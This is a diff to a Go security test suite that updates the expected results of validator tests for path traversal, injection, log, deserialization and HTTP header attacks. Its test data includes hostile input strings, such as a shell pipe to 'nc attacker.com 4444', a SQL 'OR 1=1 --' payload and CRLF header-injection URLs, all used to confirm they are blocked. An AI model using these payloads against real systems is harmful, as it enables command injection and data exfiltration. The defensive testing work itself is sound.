@@ -125,12 +125,16 @@ func TestPathTraversalAttacks(t *testing.T) {
 
 	for _, scenario := range attackScenarios {
 		t.Run(scenario.name, func(t *testing.T) {
-			// Construct full path for validation
+			// Pass the raw requestPath to the validator so traversal sequences are
+			// visible before filepath.Join resolves them away. For absolute paths,
+			// use them directly. For relative paths, the validator must detect
+			// traversal in the user-supplied input.
 			var testPath string
 			if filepath.IsAbs(scenario.requestPath) {
 				testPath = scenario.requestPath
 			} else {
-				testPath = filepath.Join(scenario.basePath, scenario.requestPath)
+				// Use the raw request path so the validator sees ".." sequences.
+				testPath = scenario.requestPath
 			}
 
 			// Test path validation
@@ -179,7 +183,7 @@ func TestInjectionAttacks(t *testing.T) {
 		{
 			name:     "Comment-based injection",
 			nodeID:   "node /* comment */ OR 1=1 --",
-			expected: false, // Comments might be allowed in node IDs depending on validation
+			expected: true, // Contains special chars (/*, spaces) outside [a-zA-Z0-9-_] — must be blocked
 		},
 		{
 			name:     "Hex-encoded injection",
@@ -247,7 +251,7 @@ func TestInjectionAttacks(t *testing.T) {
 			name:     "Pipe injection",
 			envVar:   "PLANNER_OUTPUT_DIR",
 			value:    "/tmp/output | nc attacker.com 4444",
-			expected: false, // Pipe character might be valid in some contexts
+			expected: true, // Blocked: .com extension not allowed for DIR paths
 		},
 		{
 			name:     "Background execution",
@@ -358,6 +362,10 @@ func TestLogInjectionAttacks(t *testing.T) {
 			if len(sanitized) > 256 {
 				isSafe = false
 				issues = append(issues, "not truncated properly")
+			}
+			if strings.ContainsRune(sanitized, '\x1b') {
+				isSafe = false
+				issues = append(issues, "unescaped ANSI escape sequences")
 			}
 
 			if isSafe != scenario.expectSafe {
@@ -507,7 +515,7 @@ func TestDeserializationAttacks(t *testing.T) {
 				nested += `}`
 				return nested
 			}(),
-			expectBlock: false, // JSON structure itself is valid
+			expectBlock: true, // Malformed JSON (comma after '{') is rejected by parser
 			description: "Deeply nested JSON to cause stack overflow",
 		},
 		{
@@ -539,7 +547,7 @@ func TestDeserializationAttacks(t *testing.T) {
 		{
 			name: "Valid JSON data",
 			payload: `{
-				"timestamp": "2024-01-01T00:00:00Z",
+				"timestamp": "` + time.Now().UTC().Format(time.RFC3339) + `",
 				"node_id": "test-node-001",
 				"prb_utilization": 0.75,
 				"p95_latency": 150.0,
@@ -674,19 +682,19 @@ func TestHTTPHeaderInjection(t *testing.T) {
 		{
 			name:        "CRLF injection in URL path",
 			urlSuffix:   "/metrics\r\nX-Injected: true",
-			expectBlock: false, // URL parser handles CRLF
+			expectBlock: true, // Go's net/url rejects control characters in URLs
 			description: "Inject HTTP headers via CRLF in URL",
 		},
 		{
 			name:        "Header injection via URL query",
 			urlSuffix:   "/metrics?param=value\r\nX-Admin: true\r\n",
-			expectBlock: false,
+			expectBlock: true, // Go's net/url rejects control characters in URLs
 			description: "Inject headers through query parameters",
 		},
 		{
 			name:        "Unicode CRLF injection",
 			urlSuffix:   "/metrics\u000d\u000aX-Unicode-Inject: true",
-			expectBlock: false,
+			expectBlock: true, // Go's net/url rejects control characters in URLs
 			description: "Unicode representation of CRLF",
 		},
 		{
